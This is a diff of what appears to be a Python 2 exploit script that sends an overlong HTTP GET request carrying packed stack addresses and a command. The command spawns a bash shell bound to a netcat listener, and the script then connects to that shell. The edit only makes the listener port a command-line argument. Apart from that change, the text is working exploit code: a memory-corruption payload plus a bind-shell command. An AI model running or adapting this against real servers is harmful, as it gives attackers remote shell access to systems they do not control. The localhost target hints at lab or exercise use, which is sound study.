@@ -22,7 +22,7 @@ p += pack('<I', 0xffffcc10) #cmd
 p += pack('<I', 0xffffc850)
 p += pack('<I', 0xffffc850)
 p += ' '*90
-p += "bash -c 'coproc p { /bin/bash 2>&1; }; nc -l 127.0.0.1 3000 <&${p[0]} >&${p[1]}'    "
+p += "bash -c 'coproc p { /bin/bash 2>&1; }; nc -l 127.0.0.1 "+sys.argv[2]+" <&${p[0]} >&${p[1]}'    "
 
 sock.sendall("GET /"+" "+'w'*119+p+"\r\n\r\n")
 #sock.sendall("GET /aaa"+" "+'a'*95+"abcdefghijklmnopqrstuvwx"+c+"34567890"+p+p+"abcdefgh\r\n\r\n")
@@ -31,7 +31,7 @@ sock.sendall("GET /"+" "+'w'*119+p+"\r\n\r\n")
 time.sleep(2)
 print "connecting ..."
 port = int(sys.argv[2])
-sock = socket.create_connection(('127.0.0.1', 3000),
+sock = socket.create_connection(('127.0.0.1', port),
                                 socket.getdefaulttimeout(),
                                 ('127.0.0.1', 0))
 print "connected"
